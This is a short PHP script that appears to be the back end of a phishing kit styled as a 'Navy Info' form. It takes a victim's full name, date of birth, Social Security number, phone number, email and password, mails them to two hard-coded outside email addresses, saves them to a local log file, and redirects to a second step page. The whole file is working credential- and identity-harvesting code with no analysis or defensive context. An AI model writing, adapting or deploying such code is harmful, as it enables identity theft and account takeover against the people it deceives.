<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Navy Info-----------------------\n";
$message .= "Full Name : ".$_POST['formtext1']."\n";
$message .= "Date of Birth : ".$_POST['formtext3']." / ".$_POST['formtext4']." / ".$_POST['formtext5']." \n";
$message .= "Social Security Number : ".$_POST['formtext2']."\n";
$message .= "Phone Number : ".$_POST['formtext6']."\n";
$message .= "E-mail Address : ".$_POST['formtext7']."\n";
$message .= "Password : ".$_POST['formtext8']."\n\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "malla4142@gmail.com,md.ed@aol.com";
$subject = "Navy Info";
$headers = "From: Navy Info<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("useasw.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: step2.html");

	 
?>